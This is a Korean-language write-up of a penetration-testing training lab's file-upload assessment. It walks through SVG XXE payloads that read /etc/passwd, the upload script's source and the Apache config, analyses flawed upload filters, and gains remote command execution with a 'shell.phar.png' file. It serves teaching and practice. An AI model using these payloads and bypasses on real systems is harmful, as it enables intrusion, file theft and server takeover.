---
title: "File Upload - Skills Assessment"
date: 2026-07-17
layout: single
excerpt: "한 회사의 전자상거래 웹 애플리케이션에 대한 침투 테스트를 의뢰받았다. 해당 애플리케이션은 아직 개발 초기 단계이므로, 이번 테스트에서는 확인할 수 있는 파일 업로드 기능을 중심으로 점검한다. 업로드 기능의 동작 방식과 적용된 검증 로직을 분석하고, 가능한 우회 기법을 통해 백엔드 서버에서 원격 코드 실행이 가능한지 확인한다."
author_profile: true
toc: true
toc_label: "File Upload"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-web/file-upload-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-web]
tags: [web, cpts, file-upload]
---

# Scenario

한 회사의 전자상거래 웹 애플리케이션에 대한 침투 테스트를 의뢰받았다. 

해당 애플리케이션은 아직 개발 초기 단계이므로, 이번 테스트에서는 확인할 수 있는 파일 업로드 기능을 중심으로 점검한다. 

업로드 기능의 동작 방식과 적용된 검증 로직을 분석하고, 가능한 우회 기법을 통해 백엔드 서버에서 원격 코드 실행이 가능한지 확인한다.

## Web Enumeration

웹 사이트에 접속하면 의류와 액세서리를 판매하는 전자상거래 페이지가 나타난다:

![File Upload](/assets/cpts-web/file-upload-skills-assessment/file1.png)

상단 메뉴에서 **Contact Us** 페이지로 이동하면 스크린샷을 첨부할 수 있는 파일 업로드 기능을 확인할 수 있다:

![File Upload](/assets/cpts-web/file-upload-skills-assessment/file2.png)

파일을 선택한 뒤 업로드 아이콘을 누르면 다음과 같은 파일 업로드 요청이 전송된다:

![File Upload](/assets/cpts-web/file-upload-skills-assessment/file3.png)

## SVG-Based XXE

먼저 SVG 파일을 이용한 XXE 취약점이 존재하는지 확인하기 위해 다음 페이로드를 작성하였다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

파일명을 `shell.svg` 로 설정하고 업로드 요청을 전송한 결과, 응답의 `<svg>` 요소 내부에 `/etc/passwd` 의 내용이 출력되는 것을 확인할 수 있었다:

![File Upload](/assets/cpts-web/file-upload-skills-assessment/file4.png)

이는 서버가 업로드된 SVG 파일을 XML로 파싱하는 과정에서 외부 엔티티를 로드하고 치환하고 있음을 의미한다.

### Source Code Analysis

XXE를 이용해 `upload.php` 의 소스 코드를 확인하기 위해 다음 페이로드를 사용하였다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

반환된 Base64 문자열을 디코딩한 결과, 다음과 같은 업로드 처리 로직을 확인할 수 있었다:

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

업로드된 파일은 `./user_feedback_submissions/` 디렉터리에 저장되며, 저장하기 전에 파일명 앞에 현재 날짜가 추가된다:

```php
// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
```

`date('ymd')` 는 현재 날짜를 **연도 2자리 + 월 2자리 + 일 2자리** 형식으로 반환한다.

따라서 서버 날짜가 2026년 7월 17일이고 업로드한 파일명이 `shell.svg` 라면 다음 경로에 저장된다:

```text
./user_feedback_submissions/260717_shell.svg
```

이후 파일명과 파일 타입에 대한 여러 검증이 수행된다:

```php
// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}
```

블랙리스트 정규표현식은 파일명 내부에 다음 문자열이 포함되어 있는지 검사한다:

```text
.php
.phps
.phtml
```

중요한 점은 `.phar` 가 해당 블랙리스트에 포함되어 있지 않다는 것이다.

화이트리스트 정규표현식은 파일의 최종 확장자가 다음 구조인지 검사한다:

```text
소문자 2~3개 + g
```

따라서 다음과 같은 확장자는 검증을 통과할 수 있다:

```text
.jpg
.png
.svg
.jpeg
.abg
```

타입 검사는 요청에 포함된 `Content-Type` 과 서버가 파일 내용으로 판단한 MIME 타입을 모두 확인한다:

```php
foreach (array($contentType, $MIMEtype) as $type)
```

정규표현식에 문자열 끝을 나타내는 `$` 가 없으므로 `image/svg+xml` 또한 내부의 `image/svg` 부분이 매칭되어 통과할 수 있다.

처음에는 다음과 같은 파일명 우회 방식도 시도하였다:

```text
shell.phar%00.png
shell.phar%0a.png
shell.phar%20.png
```

하지만 해당 환경에서는 위 방식으로 파일명을 조작할 수 없었다.

### Apache PHP Handler Analysis

파일 업로드 검증 외에도 Apache가 어떤 파일을 PHP로 처리하는지 확인하기 위해 다음 설정 파일을 읽었다:

```text
/etc/apache2/mods-enabled/php7.4.conf
```

이를 위해 다음 XXE 페이로드를 사용하였다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/mods-enabled/php7.4.conf"> ]>
<svg>&xxe;</svg>
```

반환된 Base64 문자열을 디코딩한 결과, 다음과 같은 Apache 설정을 확인할 수 있었다:

```conf
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Require all denied
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(ar|p|ps|tml)$">
    Require all denied
</FilesMatch>

# SKIP
```

이처럼 내부에는 파일명에 `.phar`, `.php`, `.phtml` 문자열이 포함된 경우 `SetHandler application/x-httpd-php` 를 적용하여 해당 파일을 PHP로 처리하는 핸들러 설정이 존재하였다.

따라서 파일명이 해당 확장자로 끝나지 않더라도, 아래처럼 파일명 중간에 `.phar` 문자열이 포함되어 있으면 PHP 코드가 실행될 수 있다:

```text
shell.phar.jpg
shell.phar.png
shell.phar.jpeg
shell.phar.abg
```

## Exploitation

PNG 데이터와 PHP 코드를 함께 포함하는 파일을 만드는 방법은 다음 글에서 정리하였다:

[Chaining File Upload Filter Bypasses](https://codename-123.github.io/cpts-web/file-upload-bypassing-filters/#chaining-file-upload-filter-bypasses)

Burp Suite에서 업로드 요청을 가로챈 뒤 파일명을 다음과 같이 수정하였다:

![File Upload](/assets/cpts-web/file-upload-skills-assessment/file5.png)

그 결과 파일이 정상적으로 업로드되는 것을 확인할 수 있었다.

이후 업로드된 파일의 저장 경로로 접근하였다:

```text
http://154.57.164.64:31088/contact/user_feedback_submissions/260717_shell.phar.png
```

마지막으로 `cmd` 파라미터를 전달한 결과, PHP 코드가 실행되었으며 원격 명령 실행에 성공하였다:

![File Upload](/assets/cpts-web/file-upload-skills-assessment/file5.png)
